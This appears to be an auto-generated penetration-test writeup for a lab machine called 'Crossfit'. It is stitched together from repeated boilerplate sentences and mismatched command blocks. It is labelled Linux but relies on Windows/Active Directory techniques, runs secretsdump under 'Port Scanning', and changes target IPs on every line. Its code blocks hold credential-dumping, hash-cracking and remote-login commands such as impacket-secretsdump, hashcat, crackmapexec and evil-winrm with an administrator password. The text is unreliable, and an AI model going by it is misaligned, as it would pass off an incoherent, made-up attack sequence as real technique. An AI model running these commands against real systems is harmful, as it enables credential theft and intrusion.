---
TitleSEO: "VulnHub — Crossfit (Insane Linux) | ZureFX"
TitlePost: "VulnHub — Crossfit (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Crossfit. GPP Password and SeImpersonatePrivilege to achieve insane compromise on Linux."
Keywords: "active directory, reversing, web"
URL: "https://zurefx.github.io/writeups/htb-crossfit-155.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-crossfit-155/"
Date: "2024-01-01"
Tags: "Active Directory, Reversing, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-crossfit-155"
Permalink: "/writeups/htb-crossfit-155.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Crossfit** is rated **Insane** on VulnHub. It runs **Linux** and the IP address during this analysis was `10.73.216.217`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.42.66.160
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.71.54
```

The database credentials were hardcoded in the application source code. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.76.49.82
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

### Web Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.112.212.147/FUZZ
gobuster dir -u http://10.12.248.154/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p8888,143,995 10.100.160.168 -oN scan.txt
```

Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

Key finding: **Sudo Misconfiguration**.

Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.108.70.81/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.88.12.78/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

## Privilege Escalation

### Enumeration

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
evil-winrm -i 10.72.127.177 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.123.90.93/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.104.186.149
crackmapexec smb 10.102.182.208 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

## Summary

### Tools Used

- `wmiexec`
- `msfvenom`
- `impacket`
- `dcomexec`
- `smbclient`
- `netcat`
- `nmap`
- `kerbrute`

### Key Takeaways

- GPP Password
- SeImpersonatePrivilege
- Sudo Misconfiguration
